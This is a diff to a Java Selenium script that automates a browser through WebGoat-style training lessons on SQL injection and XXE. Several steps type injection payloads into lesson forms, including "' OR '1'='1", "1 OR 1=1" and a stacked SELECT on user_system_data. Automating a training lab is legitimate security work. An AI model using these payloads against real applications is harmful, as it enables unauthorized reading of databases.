@@ -46,15 +46,26 @@ public class ChromeScript {
                 driver.findElement(By.className("btn-primary")).click();
             }
 
-            // Navigate to String SQL Injection section
-            driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/6");
+         // Navigate to String SQL Injection section
+/*            driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/1");
             delay(1000);
-            retryingFindSendKeys(driver, By.xpath("//*[@id=\"lesson-content-wrapper\"]/div[6]/div[9]/div[2]/form/table/tbody/tr/td[2]/input"), "' OR '1'='1");
+            retryingFindSendKeys(driver, By.xpath("//*[@id=\"lesson-content-wrapper\"]/div[6]/div[4]/div[2]/form/table/tbody/tr/td[2]/input"), "select department from employees where first_name='Bob'");
+            driver.findElement(By.xpath("//*[@id=\"lesson-content-wrapper\"]/div[6]/div[4]/div[2]/form/table/tbody/tr[2]/td/button")).click();
+            
+            *///New addition
+            
+            // Navigate to String SQL Injection section
+            driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/8");
+            delay(1000);
+            retryingFindSendKeys(driver, By.xpath("//*[@id=\"lesson-content-wrapper\"]/div[6]/div[9]/div[2]/form/table/tbody/tr/td[2]/input"), "'");
+            retryingFindSendKeys(driver, By.xpath("//*[@id=\"lesson-content-wrapper\"]/div[6]/div[9]/div[2]/form/table/tbody/tr/td[3]/input"), " OR ");
+            retryingFindSendKeys(driver, By.xpath("//*[@id=\"lesson-content-wrapper\"]/div[6]/div[9]/div[2]/form/table/tbody/tr/td[4]/input"), "'1'='1");
             // driver.findElement(By.name("account")).sendKeys("' OR '1'='1");
             driver.findElement(By.name("Get Account Info")).click();
 
             // Navigate to Numeric SQL Injection section
-            driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/7");
+            driver.get(url + "/start.mvc#lesson/SqlInjection.lesson/9");
+            driver.findElement(By.name("login_count")).sendKeys("1");
             driver.findElement(By.name("userid")).sendKeys("1 OR 1=1");
             driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[10]/div[2]/form/table/tbody/tr/td[3]/input")).click();
 
@@ -62,7 +73,7 @@ public class ChromeScript {
             driver.get(url + "/start.mvc#lesson/SqlInjectionAdvanced.lesson/2");
             driver.findElement(By.name("userid_6a")).sendKeys("Smith'; SELECT * FROM user_system_data WHERE '1'='1");
             driver.findElement(By.name("Get Account Info")).click();
-            driver.findElement(By.name("userid_6b")).sendKeys("dave");
+            driver.findElement(By.name("userid_6b")).sendKeys("passW0rD");
             driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[5]/div[3]/form/table/tbody/tr/td[3]/input")).click();
 
             driver.get(url + "/start.mvc#lesson/SqlInjectionAdvanced.lesson/4");
@@ -71,10 +82,13 @@ public class ChromeScript {
             driver.findElement(By.id("login-submit")).click();
 
             // SQL Injection (mitigations)
-            driver.navigate().to(url + "/start.mvc#lesson/SqlInjectionMitigations.lesson/7");
-            delay(1000);
-            driver.findElement(By.xpath("/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[10]/div[3]/form[1]/div/div/div/table/thead/tr/th[4]/span")).click();
-
+			/*
+			 * driver.navigate().to(url +
+			 * "/start.mvc#lesson/SqlInjectionMitigations.lesson/7"); delay(1000);
+			 * driver.findElement(By.xpath(
+			 * "/html/body/section/section/section/div[1]/div[1]/div/div/div/div[6]/div[10]/div[3]/form[1]/div/div/div/table/thead/tr/th[4]/span"
+			 * )).click();
+			 */
             // XXE (page 3)
             driver.navigate().to(url + "/start.mvc#lesson/XXE.lesson/2");
             driver.findElement(By.id("commentInputSimple")).sendKeys("Test comment");
